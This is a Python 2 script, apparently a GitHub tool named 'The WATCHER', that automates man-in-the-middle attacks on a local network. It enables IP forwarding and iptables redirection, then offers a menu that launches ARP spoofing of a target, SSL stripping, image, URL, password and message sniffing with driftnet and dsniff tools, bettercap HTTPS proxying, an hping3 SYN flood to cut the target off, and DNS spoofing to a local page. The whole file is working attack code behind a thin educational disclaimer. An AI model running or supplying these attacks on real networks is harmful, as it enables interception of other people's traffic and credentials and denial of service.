#!/usr/bin/env python
#sniffing tool project
"""
this tool can spy on the devices in the local network devices with many options that
can make sniffing on the local network so easy to make it done
this tool take weeks to make it more easier and flexible for all users so we will be thankful
if you can rate our tool on github :D

>>you can make some edits on this script but you can make us know first we will be 
thanked if u do this :D

>>if you found that you can't use this tool you can see our official vedio tutorial on youtube

>>we are not responsible for any bad using of this tool
cause this tool has been made for pentesters and educational purposes only.

>>if you have faced any kind of problems while using our tool you can inform us to our E_mail : 

>>last thing thanks for reading this and have a nice day :D
"""
#Coded & Developed by : David Younan[DevoOverkill9]
#-.- coding: utf-8 -.-

import os
import time
from time import sleep
import sys
import socket, struct

#adding some colors vals

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

HEADER    = '\033[95m'
OKBLUE    = '\033[94m'
OKGREEN   = '\033[92m'
WARNING   = '\033[93m'
FAIL      = '\033[91m'
END	      = '\033[0m'
BOLD      = '\033[1m'
UNDERLINE = '\033[4m'
#====================
Cyan       ="\033[0;36m"
Cafe       ="\033[0;33m"
xxx		   ="\033[0;35m"
blue       ="\033[1;34m"
trans      ="\e[0m"
BOLDxxx    = "\033[0;35m"+"\033[1m"
purple     ="\033[0;35m"


#ip rules

def get_default_gateway_linux():
    with open("/proc/net/route") as fh:
        for line in fh:
           	fields = line.strip().split()
           	if fields[1] != '00000000' or not int(fields[3], 16) & 2:
               		continue
        	return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

gateway_ip = (get_default_gateway_linux())

######################
#                    #
#GTK WARNING FIXED!	 #
#					 #
######################

#Check for root

if not os.geteuid() == 0 :
	sys.exit("{0}[x]Sorry, You need to be root to use this tool!".format(FAIL))


#os commands

flush = "sudo iptables --flush"
flush_nat = "sudo iptables --flush -t nat"
traffic_on = "sudo echo 1 > /proc/sys/net/ipv4/ip_forward"
traffic_redirect = "sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
traffic_redirect2 = "sudo iptables -t nat -A PREROUTING -p udp --destination-port 53 -j  REDIRECT --to-port 53"

#arpspoof_interface = """"arpspoof -i """
#arpspoof_target = " -t "
#arpspoof_gateway = """ " """
#bash = "; bash"
clear = "clear"
exit = "exit"

w = sleep(0.5)
os.system("sudo apt -y install iptables")
os.system("sudo apt -y install driftnet")
os.system("sudo apt -y install sslstrip")
os.system("sudo apt -y install bettercap")
os.system("sudo apt -y install hping3")
os.system("sudo apt -y install python-pip")
os.system("sudo apt -y install netdiscover")
os.system("sudo apt -y install bridge-utils")
os.system ("clear")

#Terms & Conditions>
try:
	os.system(clear)
	import terms
except ImportError:
	print ("{0}[{1}x{0}]{2}Error:Some files are NOT FOUND!").format(WHITE , RED , RED)
	sys.exit(0)	

#banner starting../
try:
	os.system(clear)
	import banner
except ImportError:
	print ("{0}[{1}x{0}]{2}Error:Some files are  NOT FOUND!").format(WHITE , RED , RED)
	sys.exit(0)



#installing python-nmap
try:
	os.system("sudo pip install python-nmap")
except IOError:
	sys.exit("{}[x]Something went wrong\nHint:make sure that you have an internet connection!".format(FAIL))
except KeyboardInterrupt:
	sys.exit("{}[x]Loading some tools has been interupted!\nHint:some tools need to installed first before continue using this tool!".format(FAIL))
print

#loading...
print ("{}").format(Cafe)
try:
	toolbar_width = 14


	sys.stdout.write("|%s|" % (" " * toolbar_width))
	sys.stdout.flush()
	sys.stdout.write("\b" * (toolbar_width+1)) #after '['

	for i in xrange(toolbar_width):
    		time.sleep(0.1)
    		sys.stdout.write("#") #GUI
    		sys.stdout.flush()

	sys.stdout.write("\n")
except KeyboardInterrupt:
	print("{0}[{1}x{0}]{2}Loading Interrupted!").format(Cafe , RED , RED)
	sys.exit(0)
print ("{0}[{1}+{0}]{2}OK!").format(WHITE , OKGREEN , OKGREEN)
#nmap can't install Error
try :
	import nmap
except ImportError :
	print ("\n{}[x]If you a got an error :").format(RED) 
	print("\n>Try : pip install python-nmap")
	print("\nThen relaunch the tool!")
	sys.exit(0)

try:
	print """
	"""
	sleep(0.5)
	#Redirecting Traffic to the client >>
	#print ("\n{0}Do you want to get network traffic now? ({1}y{0}/{2}n{0}) : ").format(OKGREEN , WHITE , RED)
	#print ("{}").format(BLUE)
	#traffic = raw_input("\nThe WATCHER > ")

	if True:
		
		print ("\n{}Starting...").format(OKGREEN)
		sleep(0.2)
		print ("\n{0}[{1}+{0}]{2}Redirecting traffic... ").format(WHITE , RED , Cafe)
		sleep(0.2)
		#os.system(flush)
		#os.system(flush_nat)
		os.system (traffic_on)
		
		print ("{0}[{1}+{0}]{2}Directing traffic to port 8080 ... ").format(WHITE , RED , Cafe)
		sleep(0.2)
		os.system (traffic_redirect)
		#os.system (traffic_redirect2)
		print ("{0}[{1}+{0}]{1}Done").format(WHITE , OKGREEN)
		
		sleep(0.2)
		
		#Get the gateway ip >>
		print ("\n{0}[{1}+{0}]{2}Getting gateway ip...").format(WHITE , RED , BLUE)

		if gateway_ip == None:
			print("\n{0}[x]Something wrong! make sure that you're connected to the internet".format(FAIL))
			sys.exit(0)
		else:
			print(gateway_ip)
			pass
		
		
		
		sleep(0.2)
		print("\n{0}Would you like to scan the local netwrok for targets? ({1}y {0}|{2} n{0})".format(OKGREEN , WHITE , FAIL))	
		print ("{}").format(BLUE)
		host_scaning = raw_input("\nThe WATCHER > ")
		if host_scaning == "y":
			sleep (0.2)
			print ("\n{0}[{1}*{0}]{2}Scanning targets in progress...").format(WHITE , RED , Cafe)
			print
			#using python-nmap
			#TODO:Show the mac address [+]
			"""
				
			nm = nmap.PortScanner()
			nm.scan(hosts = gateway_ip+"/24", arguments='-sP')
			hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
			for host, status in hosts_list:
    				print('{3}{0} : {2}{1} > {4}'.format(host, status , OKGREEN , Cafe , macaddress))
			
			"""
			try:
			    os.system("netdiscover")
			except KeyboardInterrupt:
			    pass	
			
		if host_scaning == "exit":
			sys.exit("\n{}Thanks for stopping by :)".format(Cafe))
		if host_scaning == "n":
			pass
		while None:
			print ("{}").format(BLUE)
			host_scaning = raw_input("\nThe WATCHER > ")		
		else:
			pass
		#scanning finshed!
		sleep(0.2)
		print ("\n{}Enter your target ip : ").format(BLUE)
		print ("{}").format(BLUE)
		
		target_ip = raw_input("\nThe WATCHER > ")
		if target_ip == "exit":
			sys.exit("\n{}Thanks for stopping by :)".format(Cafe))
		#showing available interfaces
		print"""\n{}Choose between these interfaces: 
		""".format(Cafe)
		sleep(0.2)
		interface_list = "sudo ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'"
		os.system(interface_list)

		print ("\n{}Enter your network interface : ").format(BLUE)
		print ("{}").format(BLUE)
		interface = raw_input("\nThe WATCHER > ")
		if interface == "exit":
			sys.exit("\n{}Thanks for stopping by :)".format(Cafe))
				
		 ##################################################
		 #					  <     >					  #
		 #												  #
		 #				LAUNCHING THE ATTACKS!			  #
		 #												  #
		 ##################################################
		
		
		
		#options list
		
		def choices ():
			sleep(1.0)
			os.system(clear)
			print("		{0}<{1}Launch these attacks!{0}>{1}:\n".format (RED , WHITE))
			
			sleep (0.1)
			print("{0}[{1}01{0}]{2} Arpspoof Target".format(YELLOW , RED , WHITE))
			
			sleep (0.1)
			print("{0}[{1}02{0}]{2} SSL Stripe".format(YELLOW , RED , WHITE))

			sleep (0.1)
			print("{0}[{1}03{0}]{2} Sniff Images".format(YELLOW , RED , WHITE))
			
			sleep (0.1)
			print("{0}[{1}04{0}]{2} Sniff Websites".format(YELLOW , RED , WHITE))
			
			sleep (0.1)
			print("{0}[{1}05{0}]{2} Sniff HTTP/Low encrypted Passwords".format(YELLOW , RED , WHITE))
			
			sleep (0.1)
			print("{0}[{1}06{0}]{2} Sniff Low Encrypted Messages".format(YELLOW , RED , WHITE))
			
			sleep (0.1)
			print("{0}[{1}07{0}]{2} Get Http/Https requests {1}<Don't need to arpspoof or sslstrip>".format(YELLOW , RED , WHITE))

			sleep (0.1)
			print("{0}[{1}08{0}]{2} Sniff All".format(YELLOW , RED , WHITE))
			
			sleep (0.1)
			print ("{0}[{1}09{0}]{2} Monitor all network traffic {1}<Don't need to arpspoof or sslstrip>".format(YELLOW , RED , WHITE))
			
			sleep (0.1)
			print("{0}[{1}10{0}]{2} Cut the internet connection off the target".format(YELLOW , RED , WHITE))
				
			sleep(0.1)
			print("{0}[{1}11{0}]{2} Dns-spoof attack".format(YELLOW , RED , WHITE))

			sleep (0.1)
			print ("{0}[{1}00{0}]{2} Exit".format(YELLOW , RED , WHITE))
			
			sleep (0.2)
			print ("{}").format(BLUE)
			client_choice = raw_input ("\nThe WATCHER > ")

			if client_choice == "exit":
				sys.exit("\n{}Thanks for stopping by :)".format(Cafe))
			

			if client_choice == "1":
				sleep(1.0)
				print ("\n{0}[{1}+{0}]{2}Arpspoofing Target! ...").format(WHITE , RED , Cafe)
				arp = 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e arpspoof -i {0} -t {1} {2} &'.format(interface , target_ip , gateway_ip)
				os.system (arp)
				#os.system ("arpPID=$!")
				return(choices())

			if client_choice == "2":
				sleep (1.0)
				print ("\n{0}[{1}+{0}]{2}Trying to Decrypt SSL Encryption!...").format(WHITE , RED , RED)
				sleep(0.5)
				sslstrip = 'sudo xterm -geometry 65x19-0-0 -fg "#0500FF" -e sslstrip -l 8080 &'
				os.system (sslstrip)
				os.system ("sslstripPID=$!")
				return(choices())



			if client_choice == "3":
				sleep (1.0)
				print("\n{0}[{1}+{0}]{2}Sniffing Images").format(RED , WHITE , Cafe)
				driftnet = 'sudo xterm -geometry 65x19+0+0 -fg "#FFB800" -e driftnet -i {0} &'.format(interface)
				print
				os.system(driftnet)
				return(choices())
			
			elif client_choice == "4":
				sleep (1.0)
				print ("\n{0}[{1}+{0}]{2}Sniffing Websites").format(RED , WHITE , Cafe)
				urlsnarf = 'sudo xterm -geometry 65x19+0-0 -fg "#33FF00" -e urlsnarf -i {} &'.format(interface)
				print
				os.system (urlsnarf)
				return(choices())
		
			
			elif client_choice == "5":
				sleep (1.0)
				print ("\n{0}[{1}+{0}]{2}Sniffing HTTP Low encrypted passwords...").format(RED , WHITE , Cafe)
				dsniff = 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e dsniff -i {} &'.format(interface)
				print
				os.system(dsniff)
				return(choices())

			elif client_choice == "6":
				sleep (1.0)
				print ("\n{0}[{1}+{0}]{2}Sniffing low encrypted messages...").format(RED , WHITE , Cafe)
				msgsnarf = 'sudo xterm -geometry 65x19-0-0 -e msgsnarf -i {} &'.format(interface)
				print
				os.system(msgsnarf)
				return(choices())

			elif client_choice == "8":
				sleep (1.0)
				print ("\n{0}Warning{1}: {2}Many pop-ups will appear!").format(RED , WHITE , Cafe)
				sleep (5.0)
				
				driftnet= 'sudo xterm -geometry 65x19+0+0 -fg "#FFB800" -e driftnet -i {0} &'.format(interface)
				
				urlsnarf= 'sudo xterm -geometry 65x19+0-0 -fg "#33FF00" -e urlsnarf -i {} &'.format(interface)
				
				dsniff= 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e dsniff -i {} &'.format(interface)
				
				msgsnarf= 'sudo xterm -geometry 65x19-0-0 -e msgsnarf -i {} &'.format(interface)
				
				print ("\n{0}[{1}+{0}]{2}Arpspoofing Target! ...").format(WHITE , RED , Cafe)
				arp = 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e arpspoof -i {0} -t {1} {2} &'.format(interface , target_ip , gateway_ip)
				os.system (arp)
				sleep (3.0)
				print ("\n{0}[{1}+{0}]{2}Trying to Decrypt SSL Encryption!...").format(WHITE , RED , RED)
				sleep(0.5)
				sslstrip = 'sudo xterm -geometry 65x19-0-0 -fg "#0500FF" -e sslstrip -l 8080 &'
				os.system (sslstrip)
				#os.system ("sslstripPID=$!")
				sleep (3.0)
				print("\n{0}[{1}+{0}]{2}Sniffing Images").format(RED , WHITE , Cafe)
				os.system(driftnet)
				sleep (3.0)
				print ("\n{0}[{1}+{0}]{2}Sniffing Websites").format(RED , WHITE , Cafe)
				os.system(urlsnarf)
				sleep (3.0)
				print ("\n{0}[{1}+{0}]{2}Sniffing HTTP Low encrypted passwords...").format(RED , WHITE , Cafe)
				os.system(dsniff)
				sleep (3.0)
				print ("\n{0}[{1}+{0}]{2}Sniffing low encrypted messages...").format(RED , WHITE , Cafe)
				os.system(msgsnarf)
				sleep (3.0)
				return(choices())
			
			elif client_choice == "7":
				sleep(1.0)
				print("\n{0}[{1}+{0}]{2}Getting {0}HTTP{2}/{3}HTTPS {2}Requests".format(RED , WHITE , Cafe , GREEN))
				#os.system("sudo kill $arpPID")
				#os.system("sudo kill $sslstripPID")
				bettercap_requests = 'sudo xterm -geometry 119x33-200-0 -e sudo bettercap -I {0} -G {1} -T {2} -X --proxy --proxy-https --sniffer-output captured-packets{2} &'.format(interface , gateway_ip , target_ip)
				os.system(bettercap_requests)
				return(choices())

			elif client_choice == "9":
				sleep(1.0)
				print("\n{0}[{1}+{0}]{2}Monitoring ALL network traffic! {3}<AGGRESSIVE!>{2}".format(RED , WHITE , Cafe , GREEN))
				#os.system("sudo kill $arpPID")
				#os.system("sudo kill $sslstripPID")
				bettercap_all = 'sudo xterm -geometry 119x33-200+0 -e sudo bettercap --proxy --proxy-https -P POST --sniffer-output captured-packets-all &'
				os.system(bettercap_all)
				return(choices())
			
			elif client_choice == "10":
				sleep(1.0)
				print("\n{0}[{1}+{0}]{2}Kick the target of network!".format(RED , WHITE , Cafe))
				cut_internet = 'sudo xterm -geometry 65x19-300-250 -fg "#FF002E" -e sudo hping3 -c 10000 -d 128 -S --flood --rand-source {} &'.format(target_ip)
				os.system(cut_internet)
				return(choices())
			elif client_choice == "11":
				print("\n{0}[{1}+{0}]{2}Dns-spoofing Attack Launch..".format(RED , WHITE , Cafe))
				os.system("touch spoofhosts.txt")
				
				print("{0}[{1}*{0}]{2}make sure that you have placed your html file in /var/www/html path\n".format(RED , WHITE , Cafe))
				print("{0}[{1}*{0}]{2}Enter the website you want to spoof target".format(RED ,WHITE ,Cafe))				
				
				print("\texample : bestgore.com")				
				print ("{}").format(BLUE)
				website_spoof = raw_input("\nThe WATCHER > ")
				if website_spoof == "":
					print("you couldn't have perform this attack without EMPTY site!")
					sleep(1.0)					
					return(choices())
				os.system("echo {} www* > spoofhosts.txt".format(target_ip))
				os.system("echo {0} {1} >> spoofhosts.txt".format(target_ip , website_spoof))
				
				dns_arp = 'sudo xterm -geometry 65x19+0+0 -fg "#FFB800" -e sudo arpspoof -t {0} {1} &'.format(target_ip , gateway_ip)
				dns_spoof = 'sudo xterm -geometry 119x33-200+0 -e sudo dnsspoof -f spoofhosts.txt host {} and udp port 53 &'.format(target_ip)
				
				os.system("systemctl start apache2")
				os.system(dns_arp)
				sleep(0.2)
				os.system(dns_spoof)
				sleep(0.5)
				return (choices())


			elif client_choice == "0":
				print ("\n{0}[{1}+{0}]{2}Friendly Exiting..".format(RED , WHITE , Cafe))
				sleep (0.5)
				print ("\n{}Thanks for stopping by :)".format(Cafe))
				sys.exit(0)

			else:
				print ("\n{}Wrong Entry!!").format(RED)
				return(choices())

		print(choices())

	#elif traffic == "n" :
	#	print ("\n{0}See ya soon {1}:D").format(Cafe , WHITE)
	#	print ("\n{0}[{1}x{0}]Exiting...").format(RED , WHITE)
	else:
		print ("\n{}[x]Wrong Entry").format(RED)
		sys.exit(0)

except KeyboardInterrupt :
	print ("""\n{0}[{1}x{0}]{2}Program has been ended
Thanks for stopping by!
		""").format(WHITE , RED , RED)
